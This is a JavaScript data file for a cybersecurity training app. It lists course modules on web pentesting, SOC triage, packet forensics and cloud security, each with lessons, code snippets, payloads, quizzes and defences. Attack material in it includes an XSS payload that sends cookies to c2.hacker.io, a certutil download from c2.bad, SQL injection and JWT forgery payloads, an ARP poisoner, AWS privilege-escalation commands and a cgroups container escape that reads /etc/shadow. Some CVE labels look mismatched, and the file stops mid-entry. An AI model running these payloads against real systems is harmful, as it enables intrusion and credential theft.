import { create } from "zustand"
import useNotificationStore from "./useNotificationStore"
import useLabStore from "./useLabStore"

export const INITIAL_COURSES = [
  {
    id: "mod-web201",
    code: "WEB-201",
    category: "web",
    track: "Red Team / Offensive",
    title: "Advanced Web Application Penetration Testing & OWASP Top 10",
    difficulty: "Intermediate",
    duration: "18 Hours",
    lessonsCount: 6,
    labsCount: 4,
    enrolledCount: "4,120",
    mitre: "T1190 / T1059",
    cert: "CEH / eJPT",
    cvssBase: "9.8 CRITICAL",
    threatProfile: "Adversary Web Exploitation & Lateral Pivot",
    description:
      "Master exploitation vectors across modern single-page apps and microservices. Dive deep into SQL injection filter evasion, DOM & Reflected XSS, Server-Side Request Forgery (SSRF), and broken object-level authorization (BOLA).",
    labLink: "/labs",
    labId: "lab-01",
    syllabus: [
      {
        id: "s1",
        title: "HTTP Protocol Internals, Header Manipulation & CORS Flaws",
        duration: "2h 15m",
        objective: "Analyze raw HTTP/1.1 and HTTP/2 headers, manipulate origin headers, and exploit misconfigured CORS policies.",
        mitre: "T1190 - Exploit Public-Facing Application",
        cve: "CWE-942: Overly Permissive CORS",
        theory:
          "Cross-Origin Resource Sharing (CORS) allows servers to specify who can access their assets. Misconfigured headers like 'Access-Control-Allow-Origin: null' or reflection of the Origin header with 'Access-Control-Allow-Credentials: true' allow malicious origins to read authenticated victim responses through a single victim visit.",
        codeSnippet: `// Vulnerable CORS Middleware implementation in Node.js Express:
app.use((req, res, next) => {
  const origin = req.headers.origin;
  // Flawed origin reflection regex: matches evil-bank.com.attacker.com
  if (origin && /bank\\.com/.test(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
  }
  next();
});`,
        codeLanguage: "javascript",
        payloadExample: `curl -H "Origin: https://bank.com.attacker.site" -H "Cookie: session=eyJhZG1pbiI6dHJ1ZX0" https://api.bank.com/user/credentials -i`,
        quiz: {
          question: "Which CORS configuration combined with 'Access-Control-Allow-Credentials: true' is most critical?",
          options: [
            "Access-Control-Allow-Origin: * (Wildcard with credentials)",
            "Access-Control-Allow-Origin dynamically reflecting arbitrary incoming Origin",
            "Access-Control-Max-Age set to 86400",
            "Access-Control-Allow-Methods: GET, POST",
          ],
          correct: 1,
          explanation: "Browsers strictly reject '*' when credentials are true, but dynamically echoing untrusted request Origin headers bypasses this restriction and completely leaks sensitive user data.",
        },
      },
      {
        id: "s2",
        title: "SQLi: Hex Encoding, Second-Order Injection & Parameterization",
        duration: "3h 40m",
        objective: "Evade Web Application Firewall (WAF) regexes using hex encoding and inline comment tricks, then enforce prepared statements.",
        mitre: "T1190 - SQL Injection Exploitation",
        cve: "CVE-2023-38606 / CWE-89",
        theory:
          "Second-Order SQL Injection occurs when malicious user input is stored safely by the initial application query (e.g. into a user profile table), but later retrieved and concatenated unsanitized into a secondary SQL query executed with administrative privileges.",
        codeSnippet: `-- Second-Order Trigger in Admin Reporting Pipeline:
-- 1. Attacker registers username: admin'--
-- 2. Later, batch audit query concatenates the stored username:
SELECT id, email, role FROM system_users 
WHERE department = 'Finance' AND created_by = 'admin'--' AND status = 'active';`,
        codeLanguage: "sql",
        payloadExample: `admin' UNION SELECT null, flag_token, 'pwned' FROM cyber_flags-- -`,
        quiz: {
          question: "Why does WAF keyword blocking often fail against advanced SQL injection?",
          options: [
            "SQL keywords are case-insensitive and can be split with comments (e.g. UN/**/ION)",
            "WAFs only inspect GET queries, never POST payloads",
            "SQL databases automatically decode base64 without instructions",
            "Database drivers ignore single quotes",
          ],
          correct: 0,
          explanation: "SQL parsers treat inline comments '/**/' as whitespace, allowing attackers to fragment signature tokens that signature-based WAFs fail to detect.",
        },
      },
      {
        id: "s3",
        title: "Cross-Site Scripting (XSS): DOM Sinks & Modern CSP Bypasses",
        duration: "3h 10m",
        objective: "Trace data flow from execution sources to dangerous DOM sinks (innerHTML, eval) and craft Content Security Policy (CSP) nonces bypasses.",
        mitre: "T1059.007 - JavaScript Execution in Browser",
        cve: "CWE-79: Cross-Site Scripting",
        theory:
          "DOM-based XSS occurs when user controllable data (location.search, document.referrer) is passed to execution sinks like element.innerHTML or document.write without prior sanitization via libraries like DOMPurify or Trusted Types API.",
        codeSnippet: `// Vulnerable Client-Side Router Component:
const params = new URLSearchParams(window.location.search);
const redirectTarget = params.get('next');
// DANGEROUS DOM SINK:
document.getElementById('status-container').innerHTML = 
  \`<p>Redirecting to <a href="\${redirectTarget}">here</a>...</p>\`;`,
        codeLanguage: "javascript",
        payloadExample: `javascript:fetch('https://c2.hacker.io/steal?c='+encodeURIComponent(document.cookie))`,
        quiz: {
          question: "Which browser API provides compile-time defense against DOM XSS injection?",
          options: [
            "Trusted Types (window.trustedTypes)",
            "XMLHttpRequest API",
            "Web Cryptography SubtleCrypto",
            "Service Worker Cache API",
          ],
          correct: 0,
          explanation: "Trusted Types enforces that strings cannot be directly assigned to dangerous DOM sinks unless wrapped in a validated TrustedHTML policy object.",
        },
      },
      {
        id: "s4",
        title: "Server-Side Request Forgery (SSRF) & Cloud Metadata Extraction",
        duration: "3h 30m",
        objective: "Pivot from external web app to internal cloud metadata APIs (169.254.169.254) to exfiltrate temporary AWS IAM session tokens.",
        mitre: "T1552.005 - Cloud Instance Metadata API",
        cve: "CVE-2021-44228 / CWE-918",
        theory:
          "When web applications fetch remote URLs on behalf of users (image previewers, webhook dispatchers, PDF generators), attackers can supply link-local IP addresses (169.254.169.254) to query AWS/Azure metadata services and extract STS credentials.",
        codeSnippet: `# Python vulnerable webhook dispatcher:
import requests
def fetch_webhook(url):
    # Vulnerable: No IP validation or DNS pinning
    response = requests.get(url, timeout=3)
    return response.text`,
        codeLanguage: "python",
        payloadExample: `http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Production-Role`,
        quiz: {
          question: "How does AWS IMDSv2 mitigate SSRF attacks compared to IMDSv1?",
          options: [
            "It requires a session token acquired via a PUT request with X-aws-ec2-metadata-token-ttl-seconds header",
            "It disables HTTP completely and only uses TLS with client certificates",
            "It moves the metadata IP to a public domain",
            "It encrypts all EC2 disks automatically",
          ],
          correct: 0,
          explanation: "IMDSv2 mandates obtaining a session token via an HTTP PUT request with custom headers, which simple GET-based SSRF vulnerabilities cannot easily forge.",
        },
      },
      {
        id: "s5",
        title: "JWT Algorithm Confusion & Insecure Direct Object References (IDOR)",
        duration: "2h 45m",
        objective: "Exploit RS256 to HS256 algorithm confusion flaws to sign forged administrative JSON Web Tokens using public keys.",
        mitre: "T1556 - Modify Authentication Process",
        cve: "CWE-347: Improper Verification of Cryptographic Signature",
        theory:
          "In algorithm confusion attacks, a backend server configured for RSA (RS256) signature verification is tricked into accepting HMAC (HS256) when an attacker modifies the JWT header 'alg' field to 'HS256' and signs the token using the server's public RSA key as the secret HMAC key.",
        codeSnippet: `// Vulnerable JWT Verification without explicit algorithm whitelist:
const jwt = require('jsonwebtoken');
function verifyToken(token) {
  // FLUID VULNERABILITY: Takes algorithm directly from token header!
  return jwt.verify(token, serverPublicKey); 
}`,
        codeLanguage: "javascript",
        payloadExample: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJTRUNVUklUWV9BRE1JTiJ9.[HMAC_SHA256_WITH_PUBLIC_KEY]`,
        quiz: {
          question: "What is the proper remediation for JWT algorithm confusion?",
          options: [
            "Hardcode algorithms: ['RS256'] explicitly in the jwt.verify options",
            "Encrypt the token with AES before transmitting",
            "Double the length of the RSA key to 4096 bits",
            "Store tokens in local storage instead of cookies",
          ],
          correct: 0,
          explanation: "Explicitly whitelisting only the intended asymmetric algorithm ('RS256') prevents the parser from executing symmetric fallback verification.",
        },
      },
      {
        id: "s6",
        title: "Capstone Lab: Enterprise Web Target Exploitation & Flag Capture",
        duration: "3h 00m",
        objective: "Chain together SSRF, SQLi filter evasion, and token forgery to achieve Remote Code Execution and capture the final root flag.",
        mitre: "T1190 & T1059 - Chained Exploitation",
        cve: "Enterprise Composite Scenario",
        theory:
          "Real-world enterprise penetration tests rarely succeed through isolated single bugs. Master the methodology of chaining low-severity information disclosure to authorization bypass, pivoting to internal administrative APIs, and achieving root container compromise.",
        codeSnippet: `# Automated exploit chain runner:
python3 exploit_chain.py \\
  --target https://target-app.cyber-range.local \\
  --vector ssrf-to-imds \\
  --forge-admin-jwt \\
  --dump-flag`,
        codeLanguage: "bash",
        payloadExample: `FLAG{WEB_EXPLOIT_CHAIN_CAPSTONE_PWNED}`,
        quiz: {
          question: "In an attack chain, what is the primary benefit of achieving SSRF to an internal microservice?",
          options: [
            "Bypassing perimeter firewalls and accessing unauthenticated internal administrative microservices",
            "Increasing the victim server's CPU frequency",
            "Decrypting HTTPS traffic on external routers",
            "Cracking salted bcrypt passwords instantly",
          ],
          correct: 0,
          explanation: "Internal service-to-service networks frequently rely on perimeter trust models and omit secondary authentication, making them ripe targets for SSRF pivots.",
        },
      },
    ],
  },
  {
    id: "mod-soc101",
    code: "SOC-101",
    category: "defensive",
    track: "Blue Team / SOC Triage",
    title: "SOC Operations, SIEM Threat Hunting & Elastic Logstash",
    difficulty: "Novice",
    duration: "14 Hours",
    lessonsCount: 5,
    labsCount: 3,
    enrolledCount: "5,840",
    mitre: "T1078 / T1053",
    cert: "CompTIA Sec+ / CySA+",
    cvssBase: "8.5 HIGH",
    threatProfile: "Living-off-the-Land (LOLBins) & Active Directory Intrusion",
    description:
      "Develop Tier-1 & Tier-2 Security Operations Center competencies. Configure SIEM correlation rules in Elastic & Splunk, identify living-off-the-land binaries (LOLBins), and parse Windows Event Logs (Sysmon) for anomalous process spawns.",
    labLink: "/labs",
    labId: "lab-04",
    syllabus: [
      {
        id: "s1",
        title: "SOC Architecture, Triaging Workflows & Severity Matrix",
        duration: "2h 00m",
        objective: "Understand the Tier-1, Tier-2, and Tier-3 triage escalation lifecycle and calculate Mean Time to Detect (MTTD).",
        mitre: "DEF-001 - Security Monitoring & Triaging",
        cve: "NIST SP 800-61 Incident Handling Guide",
        theory:
          "Modern SOC workflows categorize alerts based on true-positive probability and asset criticality. Alert fatigue is mitigated through automated SOAR playbook enrichment (virustotal queries, IP geofencing, threat intel feeds) before analyst dispatch.",
        codeSnippet: `// SOAR Playbook triage criteria:
if (alert.severity >= 3 && alert.host.environment === 'Production') {
  isolateEndpoint(alert.host.id);
  enrichThreatIntel(alert.indicators);
  dispatchUrgentTicket('SOC_TIER_2_TIAGE');
}`,
        codeLanguage: "javascript",
        payloadExample: `event.dataset: "sysmon" AND winlog.event_id: 1 AND process.name: "powershell.exe"`,
        quiz: {
          question: "What metric measures the duration from when an adversary breaches a system until the SOC detects it?",
          options: [
            "MTTD (Mean Time To Detect) / Dwell Time",
            "MTTR (Mean Time To Repair)",
            "RTO (Recovery Time Objective)",
            "SLA (Service Level Agreement)",
          ],
          correct: 0,
          explanation: "MTTD (Mean Time to Detect) represents adversary dwell time in the environment prior to alarm generation.",
        },
      },
      {
        id: "s2",
        title: "Windows Event Logs: Sysmon Event ID 1, 3, and 10 Analysis",
        duration: "3h 15m",
        objective: "Dissect Sysmon process creation (EID 1), network connections (EID 3), and process access / code injection (EID 10).",
        mitre: "T1059.001 - PowerShell Execution / T1055 - Injection",
        cve: "Sysmon Telemetry Pipeline",
        theory:
          "Sysmon provides granular kernel-level event telemetry. Event ID 1 records parent-child process relationships (e.g. WINWORD.EXE spawning powershell.exe is a classic phishing macro indicator), while Event ID 10 alerts on OpenProcess calls with VM_WRITE permissions.",
        codeSnippet: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c certutil.exe -urlcache -split -f http://c2.bad/payload.exe</Data>
  </EventData>
</Event>`,
        codeLanguage: "xml",
        payloadExample: `ParentImage:*WINWORD.EXE AND Image:*powershell.exe`,
        quiz: {
          question: "Which Sysmon Event ID directly indicates credential dumping attempts against lsass.exe?",
          options: [
            "Event ID 10 (ProcessAccess with TARGET LSASS.EXE and PROCESS_VM_READ)",
            "Event ID 5 (Process Terminated)",
            "Event ID 12 (Registry Object Created)",
            "Event ID 22 (DNS Query)",
          ],
          correct: 0,
          explanation: "Sysmon Event ID 10 alerts when a foreign process requests handles to LSASS memory with read/debug privileges.",
        },
      },
      {
        id: "s3",
        title: "SIEM Threat Hunting Queries: Elastic KQL & Splunk SPL Syntax",
        duration: "3h 30m",
        objective: "Formulate proactive threat hunting queries across millions of log records using Elasticsearch KQL and Splunk SPL.",
        mitre: "T1078 - Valid Accounts / T1003 - OS Credential Dumping",
        cve: "Sigma Detection Standards",
        theory:
          "Proactive threat hunting assumes an attacker has already bypassed automated perimeter alerts. Analysts query for rare parent-child relationships, command-line entropy, and long-tail network destinations using aggregation pipes.",
        codeSnippet: `// Splunk SPL Hunt for LOLBins command-line execution:
index=windows EventCode=1 Image IN ("*\\\\certutil.exe", "*\\\\bitsadmin.exe", "*\\\\regsvr32.exe")
| eval cmd_len = len(CommandLine)
| where cmd_len > 120
| stats count by host, User, ParentImage, CommandLine
| sort - count`,
        codeLanguage: "bash",
        payloadExample: `process.name:(certutil.exe OR bitsadmin.exe) AND process.command_line:*urlcache*`,
        quiz: {
          question: "In Splunk SPL, what command groups matching events and counts their occurrences?",
          options: ["stats count by [fields]", "search count", "eval match()", "dedup invert"],
          correct: 0,
          explanation: "| stats count by [field1, field2] is the primary aggregation command in Splunk SPL.",
        },
      },
      {
        id: "s4",
        title: "Snort & Suricata IDS Rule Authoring for Command-and-Control",
        duration: "2h 45m",
        objective: "Write byte-level network intrusion detection rules targeting Cobalt Strike malleable C2 profiles and DNS exfiltration.",
        mitre: "T1071.001 - Web Protocols C2",
        cve: "Suricata Signature Specification",
        theory:
          "Suricata inspection engines evaluate network packets against rules containing protocol, header flags, payload content, depth, and regex modifiers. Writing efficient rules prevents packet drops on 10Gbps enterprise sensor links.",
        codeSnippet: `# Suricata C2 HTTP Beacon Detection Rule:
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"MALWARE Cobalt Strike Default Malleable C2 Beacon";
  flow:established,to_server;
  http.method; content:"GET";
  http.uri; content:"/submit.php?id="; startswith;
  http.header; content:"Cookie: SESSIONID=";
  classtype:trojan-activity;
  sid:1000984; rev:1;
)`,
        codeLanguage: "bash",
        payloadExample: `suricata -r evidence_capture.pcap -c /etc/suricata/suricata.yaml -k none`,
        quiz: {
          question: "Why is 'flow:established,to_server' essential in Suricata TCP signatures?",
          options: [
            "It ensures only completed TCP 3-way handshakes heading toward the server trigger the rule, ignoring spoofed SYN floods",
            "It turns off firewall rules",
            "It speeds up DNS resolutions",
            "It tells the OS to reset the adapter",
          ],
          correct: 0,
          explanation: "Flow tracking filters out stateless scans and SYN floods, drastically cutting false positive alert volume.",
        },
      },
      {
        id: "s5",
        title: "Live Incident Simulation: APT Lateral Movement Containment",
        duration: "2h 30m",
        objective: "Orchestrate real-time host isolation, firewall policy updates, and Active Directory Kerberos ticket revocation.",
        mitre: "T1021 - Remote Services & Lateral Movement",
        cve: "Golden Ticket & Pass-the-Hash Remediation",
        theory:
          "When lateral movement is confirmed across an Active Directory domain, containment must isolate compromised endpoints while immediately triggering the KRBTGT password reset procedure twice to invalidate active Kerberos Golden Tickets.",
        codeSnippet: `# Windows Active Directory Incident Containment PowerShell:
# 1. Disable Compromised Domain User:
Disable-ADAccount -Identity "svc_backup"

# 2. Kill Active Remote SMB & WMI Sessions:
Get-CimInstance -ClassName Win32_SessionProcess | Where-Object { $_.UserName -eq "svc_backup" } | Stop-Process -Force`,
        codeLanguage: "bash",
        payloadExample: `Invoke-HostIsolation -TargetHost "FINANCE-WS-09" -Reason "Cobalt Strike C2 Beacon"`,
        quiz: {
          question: "Why must the Active Directory KRBTGT account password be reset TWICE during Golden Ticket recovery?",
          options: [
            "Active Directory stores both current and previous KRBTGT password hashes to support ticket validation history",
            "To test replication speed between domain controllers",
            "Because Windows limits password changes to 2 times a day",
            "To clear the DNS cache on client PCs",
          ],
          correct: 0,
          explanation: "AD maintains the previous password hash in history to allow graceful transition of non-expired tickets; resetting twice purges the adversary's forged Golden Ticket validity.",
        },
      },
    ],
  },
  {
    id: "mod-net301",
    code: "NET-301",
    category: "network",
    track: "Network Forensics & Packet Analysis",
    title: "Packet Forensics, Wireshark Protocol Analysis & MITM Attacks",
    difficulty: "Intermediate",
    duration: "16 Hours",
    lessonsCount: 5,
    labsCount: 3,
    enrolledCount: "3,410",
    mitre: "T1040 / T1557",
    cert: "CompTIA Network+ / CCNA",
    cvssBase: "7.9 HIGH",
    threatProfile: "Adversary Eavesdropping & Protocol Manipulation",
    description:
      "Dissect layer-2 through layer-7 network traffic down to raw bytes. Detect ARP poisoning, DNS exfiltration tunnels, and rogue DHCP servers using Wireshark, Tshark, and tcpdump capture filters.",
    labLink: "/labs",
    labId: "lab-06",
    syllabus: [
      {
        id: "s1",
        title: "TCP 3-Way Handshake, Window Scaling & Reset Injection",
        duration: "2h 30m",
        objective: "Analyze TCP SYN, SYN-ACK, ACK sequence numbers, detect RST attacks, and decode window scale options.",
        mitre: "T1040 - Network Sniffing",
        cve: "RFC 793 / RFC 7323",
        theory: "TCP maintains reliability through 32-bit sequence and acknowledgment numbers. Understanding sequence calculations is paramount to detecting TCP RST packet injection attacks designed to terminate established VPN tunnels.",
        codeSnippet: `// Tshark filter to isolate abnormal TCP RST packets:
tshark -r capture.pcap -Y "tcp.flags.reset == 1 && tcp.seq == 1" -T fields -e ip.src -e ip.dst -e tcp.srcport`,
        codeLanguage: "bash",
        payloadExample: `tcp.flags.syn == 1 and tcp.flags.ack == 0`,
        quiz: {
          question: "What flags are present in the second packet of a healthy TCP 3-way handshake?",
          options: ["SYN and ACK", "SYN only", "ACK and FIN", "PSH and URG"],
          correct: 0,
          explanation: "The server responds to the client's initial SYN packet with SYN-ACK.",
        },
      },
      {
        id: "s2",
        title: "Wireshark Display Filter Mastery & Stream Reconstruction",
        duration: "3h 15m",
        objective: "Filter through millions of PCAP packets to extract reconstructed files, credentials, and TLS server names.",
        mitre: "T1040 - Network Traffic Sniffing",
        cve: "PCAP Analysis Workflow",
        theory: "Wireshark's Follow TCP Stream reassembles fragmented IP packets into human-readable data streams, exposing cleartext protocols like HTTP, FTP, and unencrypted SMTP authentication exchanges.",
        codeSnippet: `# Wireshark Display Filter:
http.request.method == "POST" && http contains "password"`,
        codeLanguage: "bash",
        payloadExample: `tls.handshake.extensions_server_name contains "internal-corp"`,
        quiz: {
          question: "Which Wireshark filter isolates all DNS queries for TXT records (often used for C2 or exfiltration)?",
          options: ["dns.qry.type == 16", "dns.flags.response == 1", "dns.qry.name contains 'txt'", "udp.port == 80"],
          correct: 0,
          explanation: "DNS Type 16 corresponds to TXT records in RFC 1035.",
        },
      },
      {
        id: "s3",
        title: "ARP Spoofing & SSL/TLS Man-in-the-Middle Inspection",
        duration: "3h 45m",
        objective: "Execute layer-2 ARP poisoning and detect spoofed gratuitous ARP replies on switched networks.",
        mitre: "T1557.002 - ARP Poisoning",
        cve: "CWE-300: Channel Accessible by Non-Endpoint",
        theory: "Address Resolution Protocol (ARP) lacks authentication. Any workstation can broadcast unsolicited ARP replies claiming ownership of the default gateway IP, rerouting all subnet traffic through an attacker machine.",
        codeSnippet: `# Python Scapy ARP Poisoner snippet:
from scapy.all import send, ARP
arp_resp = ARP(op=2, pdst="192.168.1.50", hwdst="00:11:22:33:44:55", psrc="192.168.1.1")
send(arp_resp, loop=1, inter=2)`,
        codeLanguage: "python",
        payloadExample: `arp.duplicate-address-frame or (arp.opcode == 2 and eth.dst == ff:ff:ff:ff:ff:ff)`,
        quiz: {
          question: "What switch technology validates ARP packets against DHCP snooping bindings to prevent ARP poisoning?",
          options: ["DAI (Dynamic ARP Inspection)", "Spanning Tree Protocol (STP)", "VLAN Trunking Protocol (VTP)", "BGP Route Reflector"],
          correct: 0,
          explanation: "Dynamic ARP Inspection (DAI) cross-references ARP MAC-IP pairs with the DHCP Snooping database and drops invalid packets.",
        },
      },
      {
        id: "s4",
        title: "DNS Tunneling Detection & Protocol Anomaly Profiling",
        duration: "3h 00m",
        objective: "Profile query length, subdomain entropy, and request volume to expose DNS exfiltration channels.",
        mitre: "T1071.004 - DNS Data Exfiltration",
        cve: "DNS Tunneling Vector",
        theory: "Attackers encapsulate arbitrary TCP payloads inside DNS subdomain lookups (e.g., base64_payload.attacker-ns.com). Because enterprise recursive resolvers forward these queries outward, outbound firewalls often allow them unchecked.",
        codeSnippet: `# Calculate Shannon Entropy on DNS subdomains to detect tunneling:
import math
def entropy(s):
    p, l = [float(s.count(c)) / len(s) for c in dict.fromkeys(list(s))], len(s)
    return -sum([p_i * math.log(p_i) / math.log(2.0) for p_i in p])`,
        codeLanguage: "python",
        payloadExample: `tshark -r traffic.pcap -T fields -e dns.qry.name | awk '{print length, $0}' | sort -n`,
        quiz: {
          question: "What characteristic is a primary statistical hallmark of DNS tunneling?",
          options: ["Unusually long subdomains with high Shannon entropy", "Low query volume during daytime", "Small TXT record responses", "Only querying .org domains"],
          correct: 0,
          explanation: "High entropy and lengthy subdomain strings indicate encrypted/encoded binary payloads packaged in DNS labels.",
        },
      },
      {
        id: "s5",
        title: "Network Forensics PCAP Challenge: Extracting Exfiltrated Credentials",
        duration: "3h 30m",
        objective: "Investigate a multi-gigabyte forensic PCAP dump to reconstruct an adversary's exfiltration archive and identify leaked secrets.",
        mitre: "T1048 - Exfiltration Over Alternative Protocol",
        cve: "Forensic PCAP Challenge",
        theory: "Hands-on forensic synthesis: locate suspicious high-volume outbound sessions, reassemble HTTP/FTP transfer streams, and carve out files using tools like foremost and NetworkMiner.",
        codeSnippet: `# Carve files directly from PCAP using tshark:
tshark -r evidence.pcap --export-objects "http,./extracted_files/"`,
        codeLanguage: "bash",
        payloadExample: `FLAG{PCAP_FR3NSIC_STRE4M_UNCOV3R3D}`,
        quiz: {
          question: "Which tool automatically parses and reconstructs transmitted files, images, and credentials from PCAP dumps?",
          options: ["NetworkMiner / Wireshark Export Objects", "Nmap", "Metasploit", "Netcat"],
          correct: 0,
          explanation: "NetworkMiner and Wireshark's Export Objects feature automate file reassembly directly from packet streams.",
        },
      },
    ],
  },
  {
    id: "mod-cld401",
    code: "CLD-401",
    category: "cloud",
    track: "Cloud & DevSecOps",
    title: "Cloud Infrastructure Security & AWS IAM Privilege Escalation",
    difficulty: "Specialist",
    duration: "22 Hours",
    lessonsCount: 6,
    labsCount: 5,
    enrolledCount: "2,290",
    mitre: "T1078.004 / T1538",
    cert: "AWS Certified Security / CCSP",
    cvssBase: "9.1 CRITICAL",
    threatProfile: "Cloud Identity Hijacking & Container Escape",
    description:
      "Inspect real misconfigurations across AWS, Azure, and Kubernetes. Learn how attackers leverage PassRole permissions, S3 bucket enumeration, and container escapes to compromise enterprise cloud accounts.",
    labLink: "/labs",
    labId: "lab-03",
    syllabus: [
      {
        id: "s1",
        title: "Cloud Shared Responsibility & IAM Policy Evaluation Logic",
        duration: "3h 00m",
        objective: "Master AWS IAM explicit deny, permission boundaries, and SCP hierarchy.",
        mitre: "T1078.004 - Cloud Accounts",
        cve: "IAM Policy Evaluation Engine",
        theory: "AWS IAM evaluates requests by checking: 1) Explicit Deny, 2) Organizations SCPs, 3) Resource-based policies, 4) IAM Permissions Boundaries, 5) Session policies, 6) Identity-based policies.",
        codeSnippet: `{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "iam:PassRole",
      "Resource": "arn:aws:iam::123456789012:role/AdminRole"
    }
  ]
}`,
        codeLanguage: "json",
        payloadExample: `aws sts get-caller-identity`,
        quiz: {
          question: "In AWS IAM evaluation, what always takes absolute precedence over any Allow policy?",
          options: ["An explicit Deny in any applicable policy", "A root account permission", "An administrator role", "A resource-based policy"],
          correct: 0,
          explanation: "In AWS IAM, an explicit Deny in ANY policy overrides all Allows.",
        },
      },
      {
        id: "s2",
        title: "AWS IAM 21 Privilege Escalation Attack Vectors Explained",
        duration: "4h 30m",
        objective: "Exploit CreatePolicyVersion, SetDefaultPolicyVersion, and PassRole permissions to escalate to AdministratorAccess.",
        mitre: "T1548 - Abuse Elevation Control Mechanism",
        cve: "Rhino Security 21 IAM Vectors",
        theory: "If a low-privileged IAM principal has iam:CreatePolicyVersion permission on their own policy, they can create a new version granting themselves AdministratorAccess ('*:*') and set it as the default.",
        codeSnippet: `# AWS CLI Privilege Escalation:
aws iam create-policy-version \\
  --policy-arn arn:aws:iam::123456789012:policy/DevPolicy \\
  --policy-document file://admin_policy.json \\
  --set-as-default`,
        codeLanguage: "bash",
        payloadExample: `aws iam attach-user-policy --user-name low_priv --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`,
        quiz: {
          question: "Which IAM permission allows an attacker to attach a powerful administrative role to a newly launched EC2 instance?",
          options: ["iam:PassRole combined with ec2:RunInstances", "s3:GetObject", "cloudwatch:PutMetricData", "sns:Publish"],
          correct: 0,
          explanation: "iam:PassRole gives authorization to pass a role to a service (like EC2), granting the instance full access to that role's permissions.",
        },
      },
      {
        id: "s3",
        title: "S3 Bucket Auditing, ACL Misconfigurations & Object Encryption",
        duration: "3h 15m",
        objective: "Enumerate unauthenticated S3 buckets, analyze bucket policies, and enforce SSE-KMS customer-managed keys.",
        mitre: "T1530 - Data from Cloud Storage Object",
        cve: "Public S3 Data Leaks",
        theory: "Many enterprise cloud data breaches result from misinterpreting 'AllUsers' or 'AuthenticatedUsers' in S3 ACLs. 'AuthenticatedUsers' refers to ANY AWS account globally, not just users within your organization.",
        codeSnippet: `# Check bucket public access block:
aws s3api get-public-access-block --bucket sensitive-enterprise-backups`,
        codeLanguage: "bash",
        payloadExample: `aws s3 sync s3://target-leaky-bucket/ ./local_dump/ --no-sign-request`,
        quiz: {
          question: "In AWS S3 permissions, who is included in the 'AuthenticatedUsers' grantee group?",
          options: ["Any valid AWS account owner in the entire world", "Only users inside your specific AWS Organization", "Only IAM users in that specific account", "Only users authenticated with MFA"],
          correct: 0,
          explanation: "AWS defines 'AuthenticatedUsers' as any person with an active AWS account anywhere on Earth.",
        },
      },
      {
        id: "s4",
        title: "Kubernetes Cluster Hardening: RBAC & Pod Security Standards",
        duration: "4h 00m",
        objective: "Configure Kubernetes RBAC roles, audit privileged container security contexts, and deploy Kyverno admission controllers.",
        mitre: "T1611 - Escape to Host",
        cve: "CVE-2024-21626 / CWE-250",
        theory: "Kubernetes pods configured with 'privileged: true' or mounting the host filesystem '/var/run/docker.sock' can trivially escape container namespaces and execute arbitrary root commands on worker nodes.",
        codeSnippet: `# Secure Pod Security Context in Kubernetes YAML:
spec:
  securityContext:
    runAsNonRoot: true
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: secure-app
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]`,
        codeLanguage: "yaml",
        payloadExample: `kubectl auth can-i create pods --as system:serviceaccount:default:web-sa`,
        quiz: {
          question: "What is the critical risk of mounting /var/run/docker.sock inside a container pod?",
          options: ["The container can issue instructions to the host Docker daemon, creating root containers on the host node", "It increases network latency by 10ms", "It turns off Kubernetes load balancing", "It forces DNS queries through public servers"],
          correct: 0,
          explanation: "Access to docker.sock is equivalent to root on the underlying Kubernetes node.",
        },
      },
      {
        id: "s5",
        title: "Container Breakout: Exploiting Privileged Pods & Docker Socket",
        duration: "3h 45m",
        objective: "Execute container breakout attacks, abuse host cgroups, and extract host node credentials.",
        mitre: "T1611 - Container Escape",
        cve: "CVE-2022-0185 / CVE-2024-21626",
        theory: "Deep dive into Linux namespaces (PID, Mount, Net) and cgroups release_agent manipulation to execute host shell commands from inside a compromised container.",
        codeSnippet: `# Linux cgroups release_agent container escape POC:
mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=\`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab\`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"`,
        codeLanguage: "bash",
        payloadExample: `cat /proc/1/cgroup`,
        quiz: {
          question: "Which Linux kernel feature enforces boundary isolation between container processes and the host?",
          options: ["Linux Namespaces and Control Groups (cgroups)", "SELinux swap space", "BASH history file", "TCP window scale"],
          correct: 0,
          explanation: "Namespaces isolate process trees, network, and mount points; cgroups govern resource quotas.",
        },
      },
      {
        id: "s6",
        title: "Cloud Range Capstone: Lateral Movement from EC2 to Org Root",
        duration: "3h 30m",
        objective: "Chain together an SSRF on an EC2 app to steal instance role credentials, pivot to DynamoDB, and compromise the AWS Organization.",
        mitre: "T1078.004 & T1538 - Cloud Pivot",
        cve: "Full Multi-Tier Cloud Compromise",
        theory: "Comprehensive scenario: demonstrate the complete lifecycle of a cloud breach, from an application flaw to full multi-account infrastructure takeover.",
        codeSnippet: `# Extract and export instance profile credentials:
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws organizations list-accounts`,
        codeLanguage: "bash",
        payloadExample: `FLAG{CLOUD_RANGE_PIVOT_ORG_ROOT_PWNED}`,
        quiz: {
          question: "What AWS service logs all API calls made across an AWS Organization for forensic investigations?",
          options: ["AWS CloudTrail", "Amazon CloudWatch Metrics", "AWS X-Ray", "Amazon Inspector"],
          correct: 0,
